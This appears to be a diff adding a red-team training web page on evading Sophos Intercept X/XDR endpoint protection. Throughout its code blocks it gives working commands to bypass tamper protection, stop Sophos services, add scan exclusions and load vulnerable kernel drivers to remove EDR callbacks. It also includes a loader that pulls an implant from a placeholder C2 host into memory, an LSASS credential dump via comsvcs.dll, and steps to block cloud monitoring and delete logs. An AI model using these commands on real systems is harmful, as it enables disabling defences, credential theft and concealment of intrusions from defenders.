@@ -1,0 +1,400 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="Sophos XDR Evasion — Red Team Academy"
+  module="Evasion"
+  tags={['sophos', 'xdr', 'edr-evasion', 'sophos-intercept-x', 'byovd', 'exclusions']}
+  pageKey="evasion-sophos-xdr"
+>
+  <h1>Sophos XDR Evasion</h1>
+
+  <h2>Overview</h2>
+  <p>Sophos Intercept X / XDR is an enterprise EDR/XDR platform combining signature AV, exploit prevention, behavioral detection (Deep Learning), ransomware protection (CryptoGuard), and extended detection/response (XDR) capabilities. In managed deployments, the Sophos Central cloud console handles policy and the Sophos MDR/MTR team provides threat hunting.</p>
+  <p>Understanding Sophos's architecture helps identify which detection layer is most likely to trigger on a given technique, and what evasion approach addresses that layer. Most bypasses require local administrator or SYSTEM privilege. In Sophos-managed environments, policy changes are synced from the cloud and local tampering is detected and reported.</p>
+
+  <h2>Sophos Component Identification</h2>
+  <p>Identify whether Sophos is installed and which components are active before choosing an approach.</p>
+  <pre><code># Process identification:
+Get-Process | Where-Object &#123; $_.Name -like "*sophos*" -or $_.Name -like "*sav*" &#125;
+# Key processes:
+# SophosHealth.exe       — health reporting service
+# SophosUI.exe           — system tray UI
+# SophosSwissArmy.exe    — on-access scanning engine
+# SophosSafestore.exe    — quarantine management
+# SophosCleanM.exe       — malware cleanup
+# SophosFileScanner.exe  — file scanning component
+# SophosNetworkAgent.exe — network telemetry
+# SAVService.exe         — core AV service
+# HitmanPro.exe          — behavioral detection (HitmanPro.Alert component)
+
+# Service enumeration:
+Get-Service | Where-Object &#123; $_.DisplayName -like "*Sophos*" &#125;
+sc query type= all | findstr -i sophos
+
+# Key services:
+# Sophos Anti-Virus               — SAV service (main AV engine)
+# Sophos File Scanner             — on-demand/on-access file scanning
+# Sophos MCS Agent                — Sophos Central cloud connectivity
+# Sophos Network Threat Protection — IPS/network detection
+# Sophos Endpoint Defense         — kernel-level protection component
+# Sophos System Protection Service — exploit prevention
+
+# Kernel driver identification:
+Get-WmiObject Win32_SystemDriver | Where-Object &#123; $_.Name -like "*Sophos*" -or $_.PathName -like "*Sophos*" &#125;
+fltMC.exe  # List all minifilter drivers — look for Sophos entries
+
+# Key kernel drivers:
+# SophosED.sys      — Sophos Endpoint Defense minifilter
+# SophosAV.sys      — on-access AV minifilter
+# SAVOnAccess.sys   — legacy on-access driver
+# SophosNT.sys      — network threat protection driver
+
+# Installation path:
+ls "C:\Program Files\Sophos\"
+ls "C:\ProgramData\Sophos\"
+
+# Version and policy info:
+reg query "HKLM\SOFTWARE\Sophos\SAVService\Application" /v "Version"
+reg query "HKLM\SOFTWARE\Sophos\Remote Management System\ManagementAgent\Adapters\SAV"</code></pre>
+
+  <h2>Sophos Tamper Protection</h2>
+  <p>Sophos Tamper Protection prevents disabling of services, deletion of files, and registry modification. It's enabled by default in Sophos Central managed deployments. A local tamper protection password can be set for unmanaged installs.</p>
+  <pre><code># Check if tamper protection is enabled:
+reg query "HKLM\SOFTWARE\Sophos\SAVService\TamperProtection" /v Enabled
+# 1 = enabled, 0 = disabled
+
+# Check if managed (cloud-managed deployments lock tamper protection):
+reg query "HKLM\SOFTWARE\Sophos\Remote Management System\ManagementAgent" /v "Managed"
+
+# Tamper protection bypass — local password (unmanaged endpoints only):
+# If tamper protection is password-protected locally (not cloud managed):
+# The password hash is stored in:
+reg query "HKLM\SOFTWARE\Sophos\SAVService\TamperProtection" /v Password
+# Hash format: NTLM or SHA1 of the password — attempt offline cracking
+
+# Tamper protection bypass — SYSTEM-level access:
+# Tamper protection blocks Admin-level changes, but not SYSTEM in some builds
+# Use token impersonation to get SYSTEM, then modify Sophos registry keys
+
+# Tamper protection bypass — kernel level:
+# Sophos tamper protection has a kernel component (SophosED.sys callback)
+# Removing that kernel callback (via BYOVD) eliminates tamper protection
+
+# Once tamper protection is bypassed — disable Sophos services:
+sc stop "Sophos Anti-Virus"
+sc stop "Sophos File Scanner"
+sc stop "Sophos Endpoint Defense"
+sc stop "Sophos Network Threat Protection"
+# Set services to disabled to prevent restart:
+sc config "Sophos Anti-Virus" start= disabled</code></pre>
+
+  <h2>Sophos Exclusion Abuse</h2>
+  <p>Adding exclusions is the most reliable bypass when you have admin access and tamper protection is off or bypassable. Exclusions prevent both file scanning and behavioral monitoring for specified paths.</p>
+  <pre><code># Read current Sophos exclusions from registry:
+reg query "HKLM\SOFTWARE\Sophos\SAVService\SAV\Exclusions" /s
+
+# Add a path exclusion via Sophos SAVService API (managed via SAVAdmin):
+# Method 1: Direct registry (if tamper protection is off):
+reg add "HKLM\SOFTWARE\Sophos\SAVService\SAV\Exclusions\Paths" /v "C:\Windows\Temp" /t REG_SZ /d "" /f
+
+# Method 2: Via Sophos CLI tool (SAVAdmin / savscan):
+# C:\Program Files\Sophos\Sophos Anti-Virus\SAVAdmin.exe /excludepath C:\Windows\Temp
+
+# Method 3: Via Sophos Central cloud console (if you have console access — rare in red team):
+# Add managed exclusion policy — applied to all endpoints
+
+# Method 4: Per-process exclusions (exclude specific process from scanning):
+# Less common in Sophos but available in some policy configs via Central
+
+# Common staging paths that may already be excluded in enterprise configs:
+# C:\Windows\Temp
+# C:\Windows\SoftwareDistribution\
+# C:\Program Files\*  (sometimes overly broad exclusions added by IT)
+# Backup agent paths (Veeam, Veritas, etc.) are commonly excluded
+
+# Find exclusions applied by GPO/policy:
+reg query "HKLM\SOFTWARE\Policies\Sophos" /s</code></pre>
+
+  <h2>Bypassing Sophos File Scanning</h2>
+  <p>Sophos scans files on write and on execution (on-access). These techniques prevent signature-based detection of files on disk.</p>
+  <pre><code># 1. Encryption + in-memory decryption:
+# Encrypt payload (AES-256) on attacker machine
+openssl enc -aes-256-cbc -in payload.exe -out payload.enc -k key123
+# Transfer encrypted file — Sophos cannot identify signature in ciphertext
+# Decrypt in memory via PowerShell/C# — avoid writing decrypted binary to disk
+$encBytes = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\payload.enc")
+# Decrypt bytes in memory → load as assembly or inject as shellcode
+
+# 2. Reflective loading — never write PE to disk:
+# Download payload bytes from C2 directly into process memory
+# Reflective DLL injection or PowerShell assembly loading:
+$bytes = (New-Object Net.WebClient).DownloadData('http://c2/implant.dll')
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entry = $assembly.GetType('Namespace.Class')
+$method = $entry.GetMethod('Main')
+$method.Invoke($null, @([string[]]@()))
+
+# 3. Packing/obfuscation (reduce static signature match):
+# Custom packers that compress+encrypt the PE and load dynamically
+# Sophos Deep Learning uses ML on PE features — heavily obfuscated PEs score lower
+# Changing section names, adding junk code, modifying PE headers
+
+# 4. Splitting files + runtime reassembly:
+# Transfer in parts — each part doesn't match full signature
+# Reassemble in a temp path, execute, then delete immediately
+
+# 5. Alternate file names + renaming:
+# Simple rename (.txt, .dat, .tmp) — bypasses extension-based scanning in some configs
+# More effective: rename to match a Sophos-excluded process or path
+
+# 6. Timestomping (anti-forensics, not bypass):
+# Sophos does scan based on content, not timestamp
+# Timestomping helps post-exploitation forensic evasion, not real-time bypass</code></pre>
+
+  <h2>Bypassing Sophos Behavioral Detection (Deep Learning / HIPS)</h2>
+  <p>Sophos Intercept X includes a Deep Learning engine (ML-based file scoring), HIPS (Host Intrusion Prevention), and exploit prevention. Behavioral detections fire based on sequences of API calls and actions, not just file signatures.</p>
+  <pre><code># Sophos behavioral detection triggers to avoid:
+# - CreateRemoteThread into a non-child process
+# - VirtualAllocEx + WriteProcessMemory + CreateRemoteThread (classic injection chain)
+# - Suspicious parent-child process relationships (cmd.exe → powershell.exe → net.exe)
+# - Hollow process creation (CreateProcess SUSPENDED + memory replacement)
+# - Credential access patterns (LSASS handle opens with specific access rights)
+# - Network connections from injected processes
+
+# Alternative injection methods that reduce Sophos HIPS triggers:
+
+# 1. APC Injection (Early Bird):
+# CreateProcess(SUSPENDED) → QueueUserAPC(shellcode addr, main thread, ...) → ResumeThread
+# Sophos monitors QueueUserAPC to remote processes — use only to self-inject or into
+# processes spawned by your own code
+
+# 2. Thread hijacking (SetThreadContext):
+# Suspend a thread, modify RIP to shellcode, resume
+# Less commonly flagged than CreateRemoteThread but Sophos does monitor this
+
+# 3. Module stomping:
+# Map a legitimate DLL in target process, overwrite .text section
+# Memory appears backed by legitimate file path — behavioral anomaly score lower
+
+# 4. Indirect syscalls:
+# Sophos hooks userland APIs in ntdll — indirect syscalls bypass ntdll hooks
+# Call the syscall number directly via a ntdll gadget (ret instruction)
+# Return address shows ntdll — evades call-stack checks
+
+# 5. Parent process spoofing:
+# Use UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
+# Spawn process with spoofed parent (e.g., appear to be spawned by explorer.exe)
+# Defeats parent-child behavior rules
+
+# 6. LOLBins for execution (less behavioral scrutiny than custom EXEs):
+# Signed Windows binaries have higher trust — invoke via MSBuild, WMI, COM
+wmic process call create "powershell.exe -enc BASE64PAYLOAD"
+# COM object for execution (avoids direct spawn from shell):
+$shell = New-Object -ComObject "Shell.Application"
+$shell.ShellExecute("cmd.exe", "/c calc.exe", "", "open", 0)
+
+# 7. Avoid common credential access patterns:
+# Sophos flags OpenProcess(LSASS, PROCESS_VM_READ) at user level
+# Use comsvcs.dll MiniDump via rundll32 (LOLBin — higher trust):
+$lsassPID = (Get-Process lsass).Id
+rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $lsassPID C:\Windows\Temp\lsass.dmp full</code></pre>
+
+  <h2>Bypassing Sophos Network Threat Protection (IPS)</h2>
+  <p>Sophos Network Threat Protection performs inline network inspection, detecting known malicious traffic patterns, C2 beaconing, DNS-based C2, and exploit payloads in network streams.</p>
+  <pre><code># Identify if Network Threat Protection is active:
+Get-Service -Name "Sophos Network Threat Protection"
+# Also check: SophosNT.sys driver loaded
+
+# C2 communication evasion:
+# 1. HTTPS with domain fronting or CDN-hosted C2:
+#    Sophos NTP checks certificate subjects and SNI — domain fronting routes through
+#    legitimate CDN (Cloudflare, Azure CDN) masking the actual C2 domain
+
+# 2. Malleable C2 profiles (Cobalt Strike / Havoc):
+#    Mimic legitimate traffic (Microsoft Update, Teams API, OneDrive)
+#    Match exact HTTP headers, URIs, and timing of the spoofed application
+
+# 3. DNS over HTTPS (DoH) for C2:
+#    Sophos inspects DNS — DoH bypasses DNS-level inspection
+#    C2 channels using DoH (1.1.1.1, 8.8.8.8) bypass DNS NTP rules
+
+# 4. Protocol tunneling:
+#    Tunnel C2 over allowed protocols: DNS TXT, ICMP, HTTPS, WebSockets
+#    Sophos NTP has weaker heuristics for protocol-tunneled C2 vs raw TCP
+
+# 5. Traffic timing / jitter:
+#    Beacon intervals with high jitter (50%+) defeat time-series detection
+#    Sophos NTP and MDR hunting look for regular beacon cadence patterns
+
+# 6. Living-off-the-land network comms:
+#    certutil, curl, bitsadmin, PowerShell WebClient for C2 data transfer
+#    Less suspicious than unknown process opening TCP connections
+
+# 7. SMB/named pipe C2 (lateral movement phase):
+#    Internal C2 over SMB named pipes — Sophos NTP less focused on SMB traffic
+#    Cobalt Strike SMB listeners, custom named pipe C2 implants
+
+# Disable Sophos Network Threat Protection (admin + tamper off):
+sc stop "Sophos Network Threat Protection"
+Set-MpPreference -EnableNetworkProtection Disabled  # Also disable Windows NP</code></pre>
+
+  <h2>BYOVD Against Sophos</h2>
+  <p>When Sophos tamper protection cannot be bypassed through normal means, loading a vulnerable kernel driver provides kernel-level access to remove Sophos kernel callbacks and terminate its protected processes.</p>
+  <pre><code># Sophos kernel components to target:
+# SophosED.sys    — Endpoint Defense minifilter (registers process/thread callbacks)
+# SAVOnAccess.sys — on-access AV filter (file I/O callbacks)
+# SophosNT.sys    — network driver (NDIS filter driver)
+
+# BYOVD workflow against Sophos:
+# 1. Check HVCI status (blocks most BYOVD if enabled):
+(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).VirtualizationBasedSecurityStatus
+# 0 = disabled (BYOVD viable), 2 = enabled (BYOVD blocked)
+
+# 2. Deploy vulnerable signed driver (examples from loldrivers.io):
+#    RTCore64.sys — MSI Afterburner, arbitrary kernel R/W (IOCTL-based)
+#    gdrv.sys     — GIGABYTE, arbitrary kernel R/W
+sc.exe create VulnDrv type= kernel start= demand binPath= C:\Windows\Temp\RTCore64.sys
+net start VulnDrv
+
+# 3. Use kernel R/W to:
+#    a. Walk PspCreateProcessNotifyRoutine array, NULL Sophos entries
+#    b. Walk ObRegisterCallbacks table, remove Sophos handle protection
+#    c. Patch SophosED.sys DriverEntry callback pointers to NOP functions
+
+# 4. After callback removal, Sophos loses process visibility:
+#    Terminate Sophos processes (no PPL in most Sophos deployments):
+Stop-Process -Name "SAVService" -Force
+Stop-Process -Name "SophosSwissArmy" -Force
+Stop-Process -Name "SophosHealth" -Force
+
+# Tools for automated callback removal:
+# EDRSandblast — supports multiple vulnerable drivers, automates callback removal
+# Backstab     — uses ProcExp driver to kill protected processes
+# Terminator   — Spyboy technique, uses Zemana driver
+
+# Note: Sophos has added detections for common BYOVD drivers in recent versions
+# Less common/newer vulnerable drivers have better success rates
+# Always test in lab — driver availability and detection changes frequently</code></pre>
+
+  <h2>Sophos Live Response &amp; MTR Evasion</h2>
+  <p>Sophos MTR (Managed Threat Response) is a 24/7 human-led threat hunting and response service. When active, human analysts may initiate Live Response sessions, isolate endpoints, or terminate suspicious processes. Awareness of MTR indicators helps understand the defender's response capability.</p>
+  <pre><code># Check if Sophos Central / MTR is active (MCS Agent):
+Get-Service -Name "Sophos MCS Agent"
+sc query "Sophos MCS Agent"
+
+# MCS Agent connectivity — Sophos Central endpoint:
+# Agent communicates with: *.sophos.com, *.cloud.sophos.com
+# Block outbound to Sophos cloud to prevent policy sync and MTR communication:
+# Note: This will show as disconnected in Sophos Central — may trigger alert
+
+# Live Response detection:
+# Sophos Live Response creates a temporary agent session visible as:
+Get-Process | Where-Object &#123; $_.Name -like "*LiveResponse*" -or $_.Name -like "*SophosLR*" &#125;
+# If you see a Live Response process, an analyst is actively investigating
+
+# Indicators that MTR is hunting:
+# - Unusual Sophos processes with high CPU (scanning activity)
+# - New exclusions being removed (analyst tightening policy)
+# - Endpoint isolation (network cut except Sophos Central)
+
+# Endpoint isolation detection:
+# When MTR isolates an endpoint, a firewall rule blocks all traffic except Sophos
+# Detect via: network connectivity test to external IP fails, but Central is reachable
+
+# MTR evasion strategy:
+# 1. Operate quickly — compress the engagement timeline to reduce dwell time
+# 2. Use LOLBins — blend with legitimate admin activity
+# 3. Avoid known-bad tool signatures — custom tooling, modified open source
+# 4. Clean up artifacts immediately after each stage
+# 5. Use encrypted, timestamped comms — harder to correlate in XDR timeline</code></pre>
+
+  <h2>Sophos CryptoGuard Bypass</h2>
+  <p>CryptoGuard detects ransomware behavior by monitoring file write patterns (mass encryption of files). While primarily a defensive feature, understanding it helps avoid triggering it during operations involving bulk file manipulation.</p>
+  <pre><code># What triggers CryptoGuard:
+# - High-volume file read + overwrite/rename cycles (encryption pattern)
+# - Files written with high-entropy content (encrypted data)
+# - Shadow copy deletion (vssadmin, wmic shadowcopy delete)
+# - Modifying files in user home directories at high rates
+
+# Avoid triggering CryptoGuard during legitimate red team file operations:
+# - Process files slowly (add delays between file operations)
+# - Work on a few files at a time, not batch operations
+# - Avoid overwriting original files — copy to staging area instead
+# - Don't touch Shadow Copies during the operation
+
+# CryptoGuard also monitors:
+# - MBR/VBR writes (Master Boot Record protection)
+# - WMI persistence mechanisms that match ransomware patterns
+
+# If CryptoGuard fires during testing:
+# The process triggering it is suspended and a rollback of modified files occurs
+# Check: C:\ProgramData\Sophos\Sophos Anti-Virus\Logs\ for CryptoGuard events</code></pre>
+
+  <h2>Sophos Exploit Prevention Bypass</h2>
+  <p>Sophos Intercept X exploit prevention uses runtime instrumentation to detect memory exploitation techniques: ROP chains, stack pivots, heap sprays, JIT spraying, and process hollowing. These hooks are injected into processes at startup.</p>
+  <pre><code># Sophos exploit prevention hooks (injected as DLL into processes):
+# SophosHooksDll64.dll  — main hook library
+# SophosHooks32.dll     — 32-bit equivalent
+
+# Check if Sophos hooks are loaded in a process:
+[System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics')
+$proc = [System.Diagnostics.Process]::GetCurrentProcess()
+$proc.Modules | Where-Object &#123; $_.ModuleName -like "*sophos*" &#125;
+
+# What Sophos hooks detect:
+# - ROP gadget-based code execution (stack pivot patterns)
+# - Heap spray via SetWindowLong / SetWindowLongPtr abuse
+# - JIT spraying in .NET/JavaScript engines
+# - Credential theft via direct LSASS memory reads (MiniDumpWriteDump monitoring)
+# - Process hollowing (WriteProcessMemory to hollowed process)
+# - Reflective DLL injection patterns (suspicious VirtualAlloc + copy + execute)
+
+# Bypass — avoid hooked APIs:
+# 1. Indirect syscalls — bypass userland hooks entirely (NtAllocateVirtualMemory, etc.)
+# 2. Module unhooking — restore ntdll.dll from a clean copy on disk:
+#    a. Open \KnownDlls\ntdll.dll (clean copy from KnownDlls section)
+#    b. Map it as a new section in your process
+#    c. Copy the clean .text section over the hooked ntdll .text
+#    d. All future ntdll calls use the unhooked version
+# 3. DLL search order hijacking to load before Sophos hooks initialize
+# 4. Manual DLL loading — load ntdll from disk path to get a clean copy
+
+# Exploit prevention evasion via process targeting:
+# Sophos hooks are injected into new processes — not all processes may be hooked
+# Legacy processes, services started before Sophos hooks loaded, or excluded processes
+# Check: processes running before Sophos was installed may lack hooks
+# Also: 32-bit processes on 64-bit systems may use different hook library</code></pre>
+
+  <h2>Sophos Log &amp; Evidence Sources</h2>
+  <p>Understanding Sophos's logging helps with situational awareness during an engagement and with understanding what artifacts to clean up.</p>
+  <pre><code># Sophos local log locations:
+ls "C:\ProgramData\Sophos\Sophos Anti-Virus\Logs\"
+# Key log files:
+# SAV.txt             — main AV log (detections, scans, status changes)
+# SAVOnAccess.log     — on-access scanning log
+# SophosED.log        — Endpoint Defense events
+# SophosSP.log        — System Protection / exploit prevention
+# CryptoGuard.txt     — ransomware protection events
+
+# View recent SAV detections:
+Get-Content "C:\ProgramData\Sophos\Sophos Anti-Virus\Logs\SAV.txt" | Select-String "detected|blocked|quarantine" | Select-Object -Last 50
+
+# Network Threat Protection log:
+ls "C:\ProgramData\Sophos\Sophos Anti-Virus\Logs\SophosNTP*"
+
+# Windows Event Log — Sophos events:
+Get-WinEvent -LogName "Sophos Anti-Virus" -MaxEvents 50 | Select-Object TimeCreated, Id, Message
+
+# MCS Agent log (cloud communication):
+Get-Content "C:\ProgramData\Sophos\Remote Management System\3\Logs\*.log" | Select-Object -Last 100
+
+# Quarantine location:
+ls "C:\ProgramData\Sophos\Sophos Anti-Virus\INFECTED\"
+
+# Clean up Sophos logs (admin required + tamper protection off):
+Remove-Item "C:\ProgramData\Sophos\Sophos Anti-Virus\Logs\SAV.txt" -Force
+# Note: Sophos will recreate the log file — deletion just removes prior history
+# In cloud-managed deployments, events are already sent to Sophos Central</code></pre>
+
+</TrainingPage>
